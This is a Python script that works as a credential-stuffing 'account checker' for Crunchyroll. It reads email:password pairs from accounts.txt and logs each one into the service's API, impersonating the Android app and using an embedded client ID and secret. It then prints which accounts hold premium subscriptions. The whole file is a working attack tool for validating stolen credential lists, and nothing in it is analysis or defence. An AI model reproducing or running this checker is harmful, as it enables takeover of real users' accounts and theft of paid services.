import requests, os


def test_account(email, password):
    user_login = requests.post(
        'https://beta-api.crunchyroll.com/auth/v1/token',
        {
            'username': email,
            'password': password,
            'grant_type': 'password',
            'scope': 'offline_access'
        },
        headers={'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1'},
        auth=('cr_android', '1cf35dc5-b286-4551-8835-d4b1b4258445')
    )

    if user_login.status_code != 200:
        print(f'Account {email}:{password} - Invalid email or password')
        return False

    user_login = user_login.json()

    access_token = user_login.get('access_token')

    user_profile = requests.get(
        'https://beta-api.crunchyroll.com/accounts/v1/me',
        headers={
            'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
            'Authorization': 'Bearer ' + access_token
        }
    )

    if user_profile.status_code != 200:
        print(f'Account {email}:{password} cannot get id')
        return False

    user_profile = user_profile.json()

    external_id = user_profile.get('external_id')

    benefits = requests.get(
        f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits',
        headers={
            'User-Agent': 'Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1',
            'Authorization': 'Bearer ' + access_token
        }
    )

    if benefits.status_code != 200 and benefits.json().get('code') == 'subscription.not_found':
        print(f'Account {email}:{password} - not premium')
        return False

    benefits = benefits.json()

    if benefits.get('items')[0]['benefit'] == 'cr_premium':
        return True

    return False


acc_file = open('accounts.txt', 'r', encoding="utf-8")
if os.path.getsize('accounts.txt') > 0:
    for line in acc_file.readlines():
        account_list = line.split(':')
        eml = account_list[0].strip()
        pwd = account_list[1].strip()
        if test_account(eml, pwd):
            print(f'Account {eml}:{pwd} - Premium account')
else:
    print("No accounts found, please add some accounts in accounts.txt file.")
acc_file.close()
print("\nScript finished")
